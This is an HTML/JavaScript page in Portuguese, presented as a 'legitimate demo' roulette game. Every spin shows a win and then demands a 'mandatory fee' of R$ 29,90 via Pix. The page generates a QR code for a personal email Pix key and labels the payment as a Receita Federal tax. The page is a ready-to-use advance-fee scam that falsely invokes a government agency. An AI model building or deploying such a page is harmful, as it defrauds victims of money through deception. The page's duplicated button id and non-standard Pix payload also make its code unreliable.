<!doctype html>
<html lang="pt-BR">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width, initial-scale=1" />
  <title>Roleta - Demo Legítimo</title>
  <style>
    /* Estilos anteriores */
  </style>
</head>

<body>
  <div class="container">
    <header>
      <h1>Roleta - Demo</h1>
      <p>Gire a roleta e veja quanto você ganha. Este é um exemplo legítimo / demo.</p>
    </header>

    <main>
      <div class="wheel-wrap">
        <div class="pointer" aria-hidden="true" role="presentation"></div>
        <div class="wheel" id="wheel" role="img" aria-label="roleta"></div>
        <div class="center" role="button" aria-label="Girar a roleta" id="spinBtn">Gire</div>
      </div>

      <div class="controls">
        <button id="spinBtn" aria-label="Girar a roleta">Girar Roleta</button>
      </div>

      <footer>Valores: 50, 100, 200, 300, 400, 3000, 5000, 10000</footer>
    </main>
  </div>

  <!-- Modal de prêmio -->
  <div id="modal" class="modal-backdrop" role="dialog" aria-modal="true">
    <div class="modal" role="document">
      <h2 id="modalTitle">Parabéns!</h2>
      <div class="amount" id="prizeAmount">R$ 0</div>
      <div class="small" id="modalText">Você ganhou um prêmio, mas precisa pagar uma taxa obrigatória de R$ 29,90 via Pix.</div>
      
      <!-- Exibição do QR Code -->
      <div id="qrCodeContainer" style="margin-top: 20px;">
        <div id="qrCode"></div>
      </div>

      <div class="row">
        <button id="closeBtn" class="btn-secondary">Fechar</button>
      </div>
    </div>
  </div>

  <!-- Confete incluído -->
  <script src="https://cdn.jsdelivr.net/npm/canvas-confetti@1.9.3/dist/confetti.browser.min.js"></script>
  <script src="https://cdn.jsdelivr.net/npm/qrcode@1.4.4/build/qrcode.min.js"></script>

  <script>
    const prizes = [50, 100, 200, 300, 400, 3000, 5000, 10000];
    const wheel = document.getElementById('wheel');
    const spinBtn = document.getElementById('spinBtn');
    const modal = document.getElementById('modal');
    const prizeAmount = document.getElementById('prizeAmount');
    const closeBtn = document.getElementById('closeBtn');
    const qrCodeContainer = document.getElementById('qrCode');

    const clickSound = new Audio("https://actions.google.com/sounds/v1/cartoon/wood_plank_flicks.ogg");

    // Cria setores na roleta
    prizes.forEach((val, i) => {
      const sector = document.createElement('div');
      sector.className = 'sector';
      sector.style.setProperty('--i', i);
      const slice = document.createElement('div');
      slice.className = `slice color-${(i % 4) + 1}`;
      slice.textContent = `R$ ${val}`;
      sector.appendChild(slice);
      wheel.appendChild(sector);
    });

    let spinning = false;
    let currentRotation = 0;

    // Função para gerar o QR Code do Pix
    function gerarQRCodePix(valor) {
      const chavePix = "marlonclif579@gmail.com"; // Sua chave Pix de e-mail
      const pixData = {
        valor: valor,
        chave: chavePix,
        descricao: "Taxa obrigatória - Receita Federal"
      };

      // Gerar URL do Pix em formato QR Code
      const pixUrl = `https://api.qrserver.com/v1/create-qr-code/?data=PIX|${pixData.chave}|${pixData.valor}|${pixData.descricao}&size=300x300`;

      // Criar o QR Code
      QRCode.toDataURL(pixUrl, function (err, url) {
        if (err) throw err;
        qrCodeContainer.innerHTML = `<img src="${url}" alt="QR Code Pix" />`;
      });
    }

    spinBtn.addEventListener('click', () => {
      if(spinning) return;
      spinning = true;
      spinBtn.disabled = true;

      const randomIndex = Math.floor(Math.random() * prizes.length);
      const segmentAngle = 360 / prizes.length;
      const stopAngle = (randomIndex * segmentAngle) + (segmentAngle / 2);
      const extraSpins = 360 * 5;
      const targetRotation = extraSpins + (360 - stopAngle);

      currentRotation += targetRotation;
      wheel.style.transform = `rotate(${currentRotation}deg)`;

      let clickInterval = setInterval(() => clickSound.play(), 200);

      setTimeout(() => {
        clearInterval(clickInterval);
        spinning = false;
        spinBtn.disabled = false;
        prizeAmount.textContent = `R$ ${prizes[randomIndex]}`;
        modal.style.display = 'flex';

        // Gerar o QR Code Pix após o ganho
        gerarQRCodePix(29.90);

        if(window.confetti) {
          confetti({ particleCount: 120, spread: 70, origin: { y: 0.6 } });
        }
      }, 5200);
    });

    closeBtn.addEventListener('click', () => { modal.style.display = 'none'; });
  </script>
</body>
</html>
